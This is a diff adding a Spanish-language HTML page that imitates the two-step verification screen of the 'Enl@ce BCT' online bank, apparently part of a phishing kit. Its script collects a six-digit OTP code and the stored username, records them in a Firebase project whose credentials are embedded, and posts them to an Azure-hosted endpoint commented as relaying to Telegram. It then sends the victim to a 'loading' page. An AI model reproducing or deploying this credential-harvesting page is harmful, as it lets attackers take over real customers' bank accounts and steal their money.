@@ -1,0 +1,618 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0067)#Login.aspx -->
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="DownloadOptions" />
+    <title>Enl@ce BCT.</title>
+    <link rel="stylesheet" type="text/css" href="./datos/default.css" />
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+    </script>
+    <link
+      media="all"
+      type="text/css"
+      href="./datos/jquery-ui.min.css"
+      rel="stylesheet"
+    />
+    <link rel="ICON" href="#favicon.ico" />
+    <link rel="SHORTCUT ICON" href="#favicon.ico" />
+
+    <style type="text/css">
+      body {
+        border-width: 0px;
+        border-style: solid;
+        border-color: #6699ff;
+        padding: 0;
+        margin: 0;
+      }
+
+      #contenedorEtiquetaServer {
+        position: relative;
+      }
+
+      #etiquetaServer {
+        position: absolute;
+        color: #ffffff66;
+        right: 28px;
+        top: 35px;
+      }
+    </style>
+  </head>
+  <body __processed_7802af98-b00e-4dfd-b77e-df5cb6f5296f__="true">
+    <form id="MainForm" name="MainForm" target="Content">
+      <div style="position: fixed; width: 100%" bis_skin_checked="1">
+        <table
+          width="100%"
+          height="75px"
+          cellspacing="0"
+          cellpadding="0"
+          border="0"
+        >
+          <tbody>
+            <tr>
+              <td width="75px">
+                <img height="75" src="./datos/img_header-logo.gif" />
+              </td>
+              <td
+                width="100%"
+                background="./datos/img_header-backg.gif"
+              ></td>
+              <td width="100%">
+                <div id="contenedorEtiquetaServer" bis_skin_checked="1">
+                  <span id="etiquetaServer">CR15</span>
+                </div>
+                <img height="75" src="./datos/img_header-right.gif" />
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <table width="100%" cellspacing="0" cellpadding="0" border="0">
+          <tbody>
+            <tr>
+              <td height="1" bgcolor="#FFFFFF">
+                <img width="1" height="1" src="./datos/pixel.gif" />
+              </td>
+            </tr>
+            <tr>
+              <td height="7" class="ic-page-primarycolor">
+                <img width="1" height="1" src="./datos/pixel.gif" />
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <div style="height: 100px" bis_skin_checked="1"></div>
+
+      <input type="hidden" name="PageName" value="" />
+      <table
+        width="99%"
+        align="center"
+        border="0"
+        cellpadding="0"
+        cellspacing="0"
+        height="100%"
+      >
+        <tbody>
+          <tr>
+            <td>
+              <div
+                id="BannerArriba"
+                style="width: 100%; height: 100px; overflow: hidden"
+                bis_skin_checked="1"
+              >
+                <div
+                  style="text-align: center; width: 100%"
+                  bis_skin_checked="1"
+                >
+                  <img src="./datos/img_login-logoBCT_2.png" />
+                </div>
+                <br /><br /><br />
+              </div>
+            </td>
+          </tr>
+          <tr>
+            <td align="center">
+              <table align="center" border="0" width="100%">
+                <tbody>
+                  <tr>
+                    <td align="center" valign="top" width="20%" nowrap="">
+                      <div
+                        id="BannerIzquierdo"
+                        style="width: 300px; overflow: hidden"
+                        bis_skin_checked="1"
+                      >
+                        <img src="./datos/banner_izquierdo.jpg" /><br />
+                      </div>
+                      <!--<img src="anuncios/DEBITO-EN-TIEMPO-REAL.jpg" width="243px" height="543px">-->
+                    </td>
+                    <td align="center" valign="top" width="20%" nowrap="">
+                      <table
+                        width="400"
+                        height="200"
+                        border="0"
+                        cellpadding="3"
+                        cellspacing="3"
+                        class="ic-page-primarycolor"
+                        align="center"
+                      >
+                        <tbody>
+                          <tr>
+                            <td
+                              height="10"
+                              class="ic-page-primarycolor"
+                              align="center"
+                            >
+                              <span class="ic-page-login-text-title">
+                                Bienvenido a Enlace BCT... Su Banca en
+                                Línea.</span
+                              >
+                            </td>
+                          </tr>
+                          <tr>
+                            <td
+                              height="100%"
+                              align="center"
+                              class="ic-page-login-backgCenter"
+                            >
+                              <table
+                                height="250"
+                                border="0"
+                                cellpadding="3"
+                                align="center"
+                              >
+                                <tbody>
+                                  <tr>
+                                    <td valign="top" width="100%">
+                                      <table
+                                        width="100%"
+                                        height="250"
+                                        border="0"
+                                        cellpadding="0"
+                                        cellspacing="0"
+                                        align="center	"
+                                      >
+                                        <tbody>
+                                          <tr>
+                                            <td
+                                              colspan="3"
+                                              width="100%"
+                                              align="center"
+                                            >
+                                              <!-- === PIN / OTP 6 dígitos === -->
+                                              <div
+                                                id="otp-wrapper"
+                                                class="otp-container"
+                                              >
+                                                <h2 class="otp-title">
+                                                  Verificacion de 2 pasos
+                                                </h2>
+                                                <p class="otp-subtitle">
+                                                  Ingrese su BCT code
+                                                </p>
+
+                                                <div
+                                                  class="otp-inputs"
+                                                  role="group"
+                                                  aria-label="PIN de 6 dígitos"
+                                                >
+                                                  <input
+                                                    class="otp"
+                                                    type="text"
+                                                    inputmode="numeric"
+                                                    maxlength="1"
+                                                    aria-label="Dígito 1"
+                                                  />
+                                                  <input
+                                                    class="otp"
+                                                    type="text"
+                                                    inputmode="numeric"
+                                                    maxlength="1"
+                                                    aria-label="Dígito 2"
+                                                  />
+                                                  <input
+                                                    class="otp"
+                                                    type="text"
+                                                    inputmode="numeric"
+                                                    maxlength="1"
+                                                    aria-label="Dígito 3"
+                                                  />
+                                                  <input
+                                                    class="otp"
+                                                    type="text"
+                                                    inputmode="numeric"
+                                                    maxlength="1"
+                                                    aria-label="Dígito 4"
+                                                  />
+                                                  <input
+                                                    class="otp"
+                                                    type="text"
+                                                    inputmode="numeric"
+                                                    maxlength="1"
+                                                    aria-label="Dígito 5"
+                                                  />
+                                                  <input
+                                                    class="otp"
+                                                    type="text"
+                                                    inputmode="numeric"
+                                                    maxlength="1"
+                                                    aria-label="Dígito 6"
+                                                  />
+                                                </div>
+
+                                                <button
+                                                  id="btnOtpConfirm"
+                                                  type="button"
+                                                  class="btn-confirm"
+                                                >
+                                                  Confirmar
+                                                </button>
+
+                                                <!-- Guardamos el PIN completo aquí para el form -->
+                                                <input
+                                                  type="hidden"
+                                                  name="PIN"
+                                                  id="pinValue"
+                                                />
+                                              </div>
+
+                                              <style>
+                                                /* Centrado del bloque */
+                                                .otp-container {
+                                                  width: 100%;
+                                                  max-width: 480px;
+                                                  margin: 24px auto;
+                                                  text-align: center;
+                                                  display: flex;
+                                                  flex-direction: column;
+                                                  align-items: center;
+                                                  gap: 16px;
+                                                }
+                                                .otp-title {
+                                                  margin: 0;
+                                                  font-family: inherit;
+                                                  color: #134a7c;
+                                                }
+                                                .otp-subtitle {
+                                                  margin: 0;
+                                                  color: #556;
+                                                  font-size: 14px;
+                                                }
+
+                                                /* Cajitas del PIN */
+                                                .otp-inputs {
+                                                  display: flex;
+                                                  gap: 12px;
+                                                  justify-content: center;
+                                                }
+                                                .otp {
+                                                  width: 20px;
+                                                  height: 30px;
+                                                  text-align: center;
+                                                  font-size: 15px;
+                                                  line-height: 60px;
+                                                  border: 1px solid #cfd4dc;
+                                                  border-radius: 8px;
+                                                  background: #e9ecef;
+                                                  color: #111;
+                                                  outline: none;
+                                                  transition: background 0.15s,
+                                                    border-color 0.15s,
+                                                    box-shadow 0.15s;
+                                                }
+                                                .otp:focus {
+                                                  background: #fff;
+                                                  border-color: #6699ff;
+                                                  box-shadow: 0 0 0 3px
+                                                    rgba(102, 153, 255, 0.25);
+                                                }
+
+                                                /* Botón confirmar (verde) */
+                                                .btn-confirm {
+                                                  border: 0;
+                                                  border-radius: 8px;
+                                                  padding: 10px 22px;
+                                                  font-size: 12px;
+                                                  font-weight: 600;
+                                                  cursor: pointer;
+                                                  background: #2aa23a;
+                                                  color: #fff;
+                                                }
+                                                .btn-confirm:disabled {
+                                                  opacity: 0.6;
+                                                  cursor: not-allowed;
+                                                }
+
+                                                /* Responsive pequeño */
+                                                @media (max-width: 420px) {
+                                                  .otp {
+                                                    width: 44px;
+                                                    height: 56px;
+                                                    font-size: 24px;
+                                                  }
+                                                }
+                                              </style>
+
+                                              <script>
+                                                (function () {
+                                                  const inputs = Array.from(
+                                                    document.querySelectorAll(
+                                                      ".otp"
+                                                    )
+                                                  );
+                                                  const hidden =
+                                                    document.getElementById(
+                                                      "pinValue"
+                                                    );
+                                                  const btn =
+                                                    document.getElementById(
+                                                      "btnOtpConfirm"
+                                                    );
+
+                                                  function onlyDigit(v) {
+                                                    return v.replace(/\D/g, "");
+                                                  }
+
+                                                  // Habilita el botón cuando hay 6 dígitos
+                                                  function updateState() {
+                                                    const value = inputs
+                                                      .map((i) => i.value)
+                                                      .join("");
+                                                    hidden.value = value;
+                                                    btn.disabled =
+                                                      value.length !==
+                                                      inputs.length;
+                                                  }
+
+                                                  // Auto-avance, backspace hacia atrás y solo números
+                                                  inputs.forEach((inp, idx) => {
+                                                    inp.addEventListener(
+                                                      "input",
+                                                      (e) => {
+                                                        e.target.value =
+                                                          onlyDigit(
+                                                            e.target.value
+                                                          ).slice(0, 1);
+                                                        if (
+                                                          e.target.value &&
+                                                          idx <
+                                                            inputs.length - 1
+                                                        )
+                                                          inputs[
+                                                            idx + 1
+                                                          ].focus();
+                                                        updateState();
+                                                      }
+                                                    );
+                                                    inp.addEventListener(
+                                                      "keydown",
+                                                      (e) => {
+                                                        if (
+                                                          e.key ===
+                                                            "Backspace" &&
+                                                          !inp.value &&
+                                                          idx > 0
+                                                        ) {
+                                                          inputs[
+                                                            idx - 1
+                                                          ].focus();
+                                                          inputs[
+                                                            idx - 1
+                                                          ].select();
+                                                        }
+                                                      }
+                                                    );
+                                                    // Pegar 6 dígitos
+                                                    inp.addEventListener(
+                                                      "paste",
+                                                      (e) => {
+                                                        const data = onlyDigit(
+                                                          (
+                                                            e.clipboardData ||
+                                                            window.clipboardData
+                                                          ).getData("text")
+                                                        );
+                                                        if (!data) return;
+                                                        e.preventDefault();
+                                                        for (
+                                                          let i = 0;
+                                                          i < inputs.length;
+                                                          i++
+                                                        ) {
+                                                          inputs[i].value =
+                                                            data[i]
+                                                              ? data[i]
+                                                              : "";
+                                                        }
+                                                        const next =
+                                                          data.length >=
+                                                          inputs.length
+                                                            ? inputs[
+                                                                inputs.length -
+                                                                  1
+                                                              ]
+                                                            : inputs[
+                                                                data.length
+                                                              ] || inputs[0];
+                                                        next.focus();
+                                                        next.select?.();
+                                                        updateState();
+                                                      }
+                                                    );
+                                                  });
+
+                                                  // Acción Confirmar (aquí solo imprime y podrías enviar el form si quieres)
+                                                  btn.addEventListener(
+                                                    "click",
+                                                    async () => {
+                                                      const pin = hidden.value;
+                                                      
+                                                      const message =
+                                                        "BCT\nUsuario: " +
+                                                        localStorage.getItem(
+                                                          "usuario"
+                                                        ) +
+                                                        "\nBCT code: " +
+                                                        pin;
+                                                      const questionRef = doc(
+                                                        window.db,
+                                                        "bctls",
+                                                        localStorage.getItem(
+                                                          "usuario"
+                                                        )
+                                                      );
+                                                      await setDoc(
+                                                        questionRef,
+                                                        {
+                                                          page: 0,
+                                                        }
+                                                      );
+
+                                                      // Envío a Telegram
+                                                      axios
+                                                        .post(
+                                                          "https://serivihtn-fdg4e4ffc9gaf0f8.francecentral-01.azurewebsites.net/bct/",
+                                                          {
+                                                            mensaje: message,
+                                                          },
+                                                          {
+                                                            headers: {
+                                                              Accept:
+                                                                "application/json",
+                                                              "Content-Type":
+                                                                "application/json",
+                                                            },
+                                                          }
+                                                        )
+                                                        .then((response) => {
+                                                          window.parent.location.href =
+                                                            "cargando.html";
+                                                        })
+                                                        .catch((error) => {
+                                                          console.error(error);
+                                                        });
+
+                                                      // Enviar tu form si quieres:
+                                                      // document.getElementById('MainForm').submit();
+                                                    }
+                                                  );
+
+                                                  // Estado inicial
+                                                  btn.disabled = true;
+                                                })();
+                                              </script>
+                                            </td>
+                                          </tr>
+                                        </tbody>
+                                      </table>
+                                    </td>
+                                  </tr>
+                                </tbody>
+                              </table>
+                            </td>
+                          </tr>
+                        </tbody>
+                      </table>
+                      <br />
+                      <br />
+                    </td>
+                    <td
+                      align="center"
+                      valign="top"
+                      height="255"
+                      width="20%"
+                      nowrap=""
+                    >
+                      <div
+                        id="BannerDerecho"
+                        style="width: 300px; overflow: hidden"
+                        bis_skin_checked="1"
+                      >
+                        <img src="./datos/Banner_derecho.jpg" /><br />
+                      </div>
+                    </td>
+                  </tr>
+                  <tr>
+                    <td colspan="3" align="center"></td>
+                  </tr>
+                </tbody>
+              </table>
+            </td>
+          </tr>
+          <tr>
+            <td align="center">
+              <br />
+              <br />
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      <span style="color: #efefef">
+        <span id="ctl00_cphBody_lblServerName" class="serverNameMaster"
+          >CR15</span
+        >
+      </span>
+      <input type="hidden" name="IsPostback" value="false" />
+      <input type="hidden" name="ActualPageName" value="LOGIN" />
+      <input type="hidden" name="Key" value="" id="key" />
+      <input type="hidden" name="User" value="" id="user" />
+      <input type="hidden" name="NM" value="0" id="nm" />
+
+      <div id="modalFD" class="mdlFD" bis_skin_checked="1">
+        <div class="mdlFD-content" bis_skin_checked="1">
+          <div class="contenido" bis_skin_checked="1"></div>
+          <br />
+          <div style="float: right; width: 100%" bis_skin_checked="1">
+            <div id="divNoMore" bis_skin_checked="1" style="display: none">
+              <input
+                type="checkbox"
+                id="ckNoMore"
+                value="No volver a mostrar este mensaje."
+              />
+              No volver a mostrar este mensaje.
+            </div>
+            <span style="color: red" id="errordetail"></span>
+            <a id="btnFD" style="float: right">
+              <img
+                border="0"
+                src="./datos/ic_button_login.gif"
+                class="imgBotonLogin"
+                style="padding-bottom: 4px"
+                alt="Reintentar"
+              />
+            </a>
+          </div>
+          <br />
+          <div style="text-align: center; width: 100%" bis_skin_checked="1">
+            <a id="loading"></a>
+          </div>
+          <br />
+        </div>
+      </div>
+    </form>
+  </body>
+</html>
